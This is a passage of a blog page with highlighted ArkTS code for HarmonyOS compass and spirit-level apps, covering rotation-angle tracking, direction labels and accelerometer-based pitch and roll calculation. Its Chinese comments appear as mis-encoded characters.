è®¡ç®—ä¸¤ä¸ªè§’åº¦ä¹‹é—´çš„å·®å¼‚</span></span><br><span class="line">  private <span class="title function_">calculateAngleDifference</span>(<span class="attr">currentAngle</span>: number, <span class="attr">targetAngle</span>: number): number &#123;</span><br><span class="line">    <span class="keyword">let</span> diff = targetAngle - currentAngle; <span class="comment">// è®¡ç®—è§’åº¦å·®</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (diff &gt; <span class="number">180</span>) &#123;</span><br><span class="line">      diff -= <span class="number">360</span>; <span class="comment">// é¡ºæ—¶é’ˆæ—‹è½¬è¶…è¿‡180åº¦ï¼Œè°ƒæ•´ä¸ºè´Ÿå€¼</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; -<span class="number">180</span>) &#123;</span><br><span class="line">      diff += <span class="number">360</span>; <span class="comment">// é€†æ—¶é’ˆæ—‹è½¬è¶…è¿‡180åº¦ï¼Œè°ƒæ•´ä¸ºæ­£å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> diff; <span class="comment">// è¿”å›è°ƒæ•´åçš„è§’åº¦å·®</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ›´æ–°æ—‹è½¬è§’åº¦</span></span><br><span class="line">  private <span class="title function_">updateRotationAngle</span>(<span class="attr">angleDifference</span>: number, <span class="attr">newAngle</span>: number): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cumulativeRotation</span> += angleDifference; <span class="comment">// ç´¯åŠ æ—‹è½¬è§’åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> += angleDifference; <span class="comment">// æ›´æ–°å½“å‰æ—‹è½¬è§’åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentAngle</span> = newAngle; <span class="comment">// æ›´æ–°å½“å‰ä¼ æ„Ÿå™¨è§’åº¦</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// åŠ¨ç”»æ›´æ–°</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">cumulativeRotation</span>; <span class="comment">// å°†æ—‹è½¬è§’åº¦è®¾ç½®ä¸ºç´¯è®¡æ—‹è½¬è§’åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ç´¯è®¡æ—‹è½¬è§’åº¦: <span class="subst">$&#123;<span class="variable language_">this</span>.cumulativeRotation&#125;</span>`</span>); <span class="comment">// æ‰“å°ç´¯è®¡æ—‹è½¬è§’åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ ¹æ®è§’åº¦è®¡ç®—æ–¹å‘</span></span><br><span class="line">  private <span class="title function_">calculateDirection</span>(<span class="attr">angle</span>: number): string &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> range <span class="keyword">of</span> <span class="variable constant_">DIRECTION_RANGES</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (angle &gt;= range.<span class="property">min</span> &amp;&amp; angle &lt; range.<span class="property">max</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> range.<span class="property">name</span>; <span class="comment">// è¿”å›å¯¹åº”çš„æ–¹å‘åç§°</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;æœªçŸ¥æ–¹å‘&#x27;</span>; <span class="comment">// å¦‚æœè§’åº¦ä¸åœ¨ä»»ä½•èŒƒå›´å†…ï¼Œè¿”å›æœªçŸ¥æ–¹å‘</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºç”¨æˆ·ç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º20</span></span><br><span class="line">      <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªè¡Œå¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º5</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">directionMessage</span>) <span class="comment">// æ˜¾ç¤ºå½“å‰æ–¹å‘</span></span><br><span class="line">          .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®å¸ƒå±€æƒé‡</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">End</span>) <span class="comment">// æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>) <span class="comment">// æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">50</span>); <span class="comment">// æ–‡æœ¬å¤§å°</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.currentAngle)&#125;</span>Â°`</span>) <span class="comment">// æ˜¾ç¤ºå½“å‰è§’åº¦</span></span><br><span class="line">          .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®å¸ƒå±€æƒé‡</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>) <span class="comment">// æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>) <span class="comment">// æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">50</span>); <span class="comment">// æ–‡æœ¬å¤§å°</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;); <span class="comment">// è®¾ç½®å®½åº¦å’Œä¸Šè¾¹è·</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123; <span class="comment">// å†…éƒ¨å †å å¸ƒå±€</span></span><br><span class="line">          <span class="title class_">Circle</span>() <span class="comment">// åˆ›å»ºä¸€ä¸ªåœ†å½¢</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">250</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">250</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">fillOpacity</span>(<span class="number">0</span>) <span class="comment">// è®¾ç½®å¡«å……é€æ˜åº¦</span></span><br><span class="line">            .<span class="title function_">strokeWidth</span>(<span class="number">25</span>) <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">            .<span class="title function_">stroke</span>(<span class="string">&#x27;#f95941&#x27;</span>) <span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">strokeDashArray</span>([<span class="number">1</span>, <span class="number">5</span>]) <span class="comment">// è®¾ç½®è¾¹æ¡†è™šçº¿æ ·å¼</span></span><br><span class="line">            .<span class="title function_">strokeLineJoin</span>(<span class="title class_">LineJoinStyle</span>.<span class="property">Round</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†è¿æ¥æ–¹å¼</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;åŒ—&#x27;</span>) <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œåŒ—â€</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#ff4f3f&#x27;</span>) <span class="comment">// è®¾ç½®æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">0</span> &#125;) <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;ä¸œ&#x27;</span>) <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œä¸œâ€</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// è®¾ç½®æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">90</span> &#125;) <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;å—&#x27;</span>) <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œå—â€</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// è®¾ç½®æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">180</span> &#125;) <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;è¥¿&#x27;</span>) <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œè¥¿â€</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#fcfdfd&#x27;</span>) <span class="comment">// è®¾ç½®æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">270</span> &#125;) <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;) <span class="comment">// è®¾ç½®ä¸Šè¾¹è·</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: -<span class="variable language_">this</span>.<span class="property">rotationAngle</span> &#125;) <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">        .<span class="title function_">animation</span>(&#123;&#125;); <span class="comment">// è®¾ç½®åŠ¨ç”»æ•ˆæœ</span></span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Line</span>() <span class="comment">// åˆ›å»ºä¸€ä¸ªçº¿æ¡</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">40</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#fdfffe&#x27;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="number">200</span> &#125;); <span class="comment">// è®¾ç½®ä¸‹è¾¹è·</span></span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">      .<span class="title function_">height</span>(<span class="number">300</span>); <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#18181a&#x27;</span>); <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="level"><a href="#level" class="headerlink" title="level"></a>level</h1><p>æ°´å¹³ä»ª</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//module.json5</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;module&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;requestPermissions&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ohos.permission.ACCELEROMETER&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥ä¼ æ„Ÿå™¨æœåŠ¡æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> &#123; sensor &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.SensorServiceKit&#x27;</span>;</span><br><span class="line"><span class="comment">// å¯¼å…¥ä¸šåŠ¡é”™è¯¯å¤„ç†æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BusinessError</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰å•ä½é•¿åº¦ï¼Œç”¨äºåç»­è®¡ç®—ä¸­çš„æ¯”ä¾‹å°º</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UNIT_LENGTH</span> = <span class="number">4</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨ @Entry å’Œ @Component è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸º LevelMeter çš„ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">LevelMeter</span> &#123;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å½“å‰è§’åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">angle</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å‰åå€¾æ–œè§’åº¦ï¼ˆpitchï¼‰</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">pitch</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å·¦å³å€¾æ–œè§’åº¦ï¼ˆrollï¼‰</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">roll</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰è§’åº¦å˜åŒ–é˜ˆå€¼ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦éœ€è¦æ›´æ–°è§’åº¦</span></span><br><span class="line">  private <span class="attr">threshold</span>: number = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„ä»¶å³å°†å‡ºç°æ—¶çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨</span></span><br><span class="line">    sensor.<span class="title function_">getSensorList</span>(<span class="function">(<span class="params">error: BusinessError</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœè·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥&#x27;</span>, error);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å¼€å§‹æ›´æ–°æ–¹å‘ä¿¡æ¯</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">startOrientationUpdates</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¯åŠ¨æ–¹å‘æ›´æ–°çš„æ–¹æ³•</span></span><br><span class="line">  private <span class="title function_">startOrientationUpdates</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// æ³¨å†ŒåŠ é€Ÿåº¦ä¼ æ„Ÿå™¨äº‹ä»¶ç›‘å¬å™¨</span></span><br><span class="line">    sensor.<span class="title function_">on</span>(sensor.<span class="property">SensorId</span>.<span class="property">ACCELEROMETER</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// è®¡ç®—æ–°çš„å‰åå€¾æ–œè§’åº¦ï¼ˆpitchï¼‰</span></span><br><span class="line">      <span class="keyword">const</span> newPitch = <span class="title class_">Math</span>.<span class="title function_">atan</span>(data.<span class="property">y</span> / <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(data.<span class="property">x</span> * data.<span class="property">x</span> + data.<span class="property">z</span> * data.<span class="property">z</span>)) * (<span class="number">180</span> / <span class="title class_">Math</span>.<span class="property">PI</span>);</span><br><span class="line">      <span class="comment">// è®¡ç®—æ–°çš„å·¦å³å€¾æ–œè§’åº¦ï¼ˆrollï¼‰</span></span><br><span class="line">      <span class="keyword">const</span> newRoll = <span class="title class_">Math</span>.<span class="title function_">atan</span>(data.<span class="property">x</span> / <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(data.<span class="property">y</span> * data.<span class="property">y</span> + data.<span class="property">z</span> * data.<span class="property">z</span>)) * (<span class="number">180</span> / <span class="title class_">Math</span>.<span class="property">PI</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å¦‚æœæ–°çš„è§’åº¦å˜åŒ–è¶…è¿‡é˜ˆå€¼ï¼Œåˆ™æ›´æ–°çŠ¶æ€</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(newPitch - <span class="variable language_">this</span>.<span class="property">pitch</span>) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span> || <span class="title class_">Math</span>.<span class="title function_">abs</span>(newRoll - <span class="variable language_">this</span>.<span class="property">roll</span>) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">pitch</span> = newPitch;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">roll</span> = newRoll;</span><br><span class="line">        <span class="comment">// æ›´æ–°å½“å‰è§’åº¦</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">angle</span> = <span class="title class_">Math</span>.<span class="title function_">hypot</span>(newPitch, newRoll);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123; <span class="attr">interval</span>: <span class="number">100000000</span> &#125;); <span class="comment">// è®¾ç½®æ›´æ–°é—´éš”ä¸º100æ¯«ç§’</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®¡ç®—å°çƒä½ç½®çš„æ–¹æ³•</span></span><br><span class="line">  private <span class="title function_">calculateBallPosition</span>(): <span class="title class_">Position</span> &#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®å½“å‰è§’åº¦è®¡ç®—åŠå¾„</span></span><br><span class="line">    <span class="keyword">const</span> radius = (<span class="variable language_">this</span>.<span class="property">angle</span> &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.<span class="property">angle</span> * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.<span class="property">angle</span> - <span class="number">10</span>))) * <span class="variable constant_">UNIT_LENGTH</span>;</span><br><span class="line">    <span class="comment">// å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦</span></span><br><span class="line">    <span class="keyword">const</span> angleInRadians = <span class="title class_">Math</span>.<span class="title function_">atan2</span>(<span class="variable language_">this</span>.<span class="property">pitch</span>, <span class="variable language_">this</span>.<span class="property">roll</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è®¡ç®—å°çƒåœ¨åœ†å‘¨ä¸Šçš„Xåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> x = -radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>(angleInRadians);</span><br><span class="line">    <span class="comment">// è®¡ç®—å°çƒåœ¨åœ†å‘¨ä¸Šçš„Yåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> y = radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>(angleInRadians);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è¿”å›å°çƒçš„ä½ç½®</span></span><br><span class="line">    <span class="keyword">return</span> &#123; x, y &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºUIçš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 